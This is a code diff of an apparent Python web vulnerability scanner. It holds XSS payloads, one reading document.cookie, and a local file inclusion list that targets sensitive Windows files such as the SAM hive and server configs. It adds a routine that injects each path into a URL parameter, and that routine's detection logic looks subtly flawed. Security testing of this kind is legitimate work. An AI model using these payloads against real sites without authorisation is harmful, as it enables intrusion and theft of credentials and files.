@@ -16,28 +16,28 @@ xss = ["'<SCRIPT>alert(0)</SCRIPT>#",
        "<a onmouseover=alert(document.cookie)>xxs link</a>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
-lfi = ["C:\boot.ini",
-        "C:\WINDOWS\win.ini",
-        "C:\WINNT\win.ini",
-        "C:\WINDOWS\Repair\SAM",
-        "C:\WINDOWS\php.ini",
-        "C:\WINNT\php.ini",
-        "C:\Program Files\Apache Group\Apache\conf\httpd.conf",
-        "C:\Program Files\Apache Group\Apache2\conf\httpd.conf",
-        "C:\Program Files\\xampp\apache\conf\httpd.conf",
-        "C:\php\php.ini",
-        "C:\php5\php.ini",
-        "C:\php4\php.ini",
-        "C:\apache\php\php.ini",
-        "C:\\xampp\apache\bin\php.ini",
-        "C:\home2\bin\stable\apache\php.ini",
-        "C:\home\bin\stable\apache\php.ini",
-        "C:\Program Files\Apache Group\Apache\logs\access.log",
-        "C:\Program Files\Apache Group\Apache\logs\error.log",
-        "C:\WINDOWS\TEMP\\",
-        "C\php\sessions\\",
-        "C:\php5\sessions\\",
-        "C:\php4\sessions\\"]
+lfi = ["C:\\boot.ini",
+        "C:\\WINDOWS\\win.ini",
+        "C:\\WINNT\\win.ini",
+        "C:\\WINDOWS\\Repair\SAM",
+        "C:\\WINDOWS\\php.ini",
+        "C:\\WINNT\\php.ini",
+        "C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf",
+        "C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf",
+        "C:\\Program Files\\xampp\\apache\\conf\\httpd.conf",
+        "C:\\php\\php.ini",
+        "C:\\php5\\php.ini",
+        "C:\\php4\\php.ini",
+        "C:\\apache\\php\\php.ini",
+        "C:\\xampp\\apache\\bin\\php.ini",
+        "C:\\home2\\bin\\stable\\apache\\php.ini",
+        "C:\\home\\bin\\stable\\apache\\php.ini",
+        "C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
+        "C:\\Program Files\\Apache Group\\Apache\\logs\\error.log",
+        "C:\\WINDOWS\\TEMP\\",
+        "C\\php\\sessions\\",
+        "C:\\php5\\sessions\\",
+        "C:\\php4\\sessions\\"]
 rfi = []
 rce = []
 
@@ -61,12 +61,12 @@ def get():
                 with urllib.request.urlopen(req) as response:
                     html = str(response.read())
                 with open("sql_errors.txt", "r") as f:
-                    for line in f:
+                    for line in f.readlines():
+                        line = line.rstrip('\n')
                         if line in html:
-                            print("\nLikely vulnerble.")
+                            print("\nLikely vulnerable.")
                             return
             except Exception as e:
-                print(type(e))
                 print(e)
 
     elif x=="2":
@@ -76,13 +76,30 @@ def get():
                 with urllib.request.urlopen(req) as response:
                    html = str(response.read())
                 if i in html:
-                    print("\nLikely vulnrable.")
+                    print("\nLikely vulnerable.")
                     break
             except Exception as e:
-                print(type(e))
                 print(e)
-                
-    elif x=="3":atk = lfi
+
+    elif x=="3":
+        n = args.url.find('=') + 1
+        for i in lfi:
+            req = args.url[:n] + i
+            try:
+                print("Trying: " + i)
+                with urllib.request.urlopen(req) as response:
+                   html = str(response.read())
+                vuln = False
+                with open("lfi_404.txt", "r") as f:
+                    for line in f.readlines():
+                        line = line.rstrip('\n')
+                        if line in html:
+                            print("Not found.\n")
+                            break
+                        vuln = True
+                if vuln:print("Likely vulnerable.\n")
+            except Exception as e:
+                print(str(e) + "\n")
     elif x=="4":atk = rfi
     elif x=="5":atk = rce
 
